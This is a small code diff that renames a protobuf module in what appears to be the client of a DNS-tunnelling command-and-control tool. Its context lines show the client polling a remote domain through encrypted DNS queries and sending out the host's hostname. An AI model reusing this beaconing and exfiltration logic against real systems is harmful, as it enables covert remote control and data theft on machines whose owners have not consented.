@@ -1,6 +1,6 @@
 import time
 import socket
-from lib.protocol import chacomm_pb2
+from lib.protocol import comm_pb2
 from lib.transport.encoding import dns_marshal, decode
 from lib.transport.dns import send_dns_query
 
@@ -15,9 +15,9 @@ def poll_read(stream):
             send_info_packet(stream)
 
 def poll(stream):
-    poll_query = chacomm_pb2.Message(
+    poll_query = comm_pb2.Message(
         clientguid=stream.client_guid,
-        pollquery=chacomm_pb2.PollQuery()
+        pollquery=comm_pb2.PollQuery()
     )
     poll_packet = dns_marshal(poll_query, stream.encryption_key, True)
     answers = send_dns_query(poll_packet.encode(), stream.target_domain)
@@ -35,9 +35,9 @@ def send_info_packet(stream):
         hostname = socket.gethostname()
     except Exception:
         hostname = "unknown"
-    info_query = chacomm_pb2.Message(
+    info_query = comm_pb2.Message(
         clientguid=stream.client_guid,
-        infopacket=chacomm_pb2.InfoPacket(hostname=hostname.encode())
+        infopacket=comm_pb2.InfoPacket(hostname=hostname.encode())
     )
     poll_packet = dns_marshal(info_query, stream.encryption_key, True)
     send_dns_query(poll_packet.encode(), stream.target_domain)
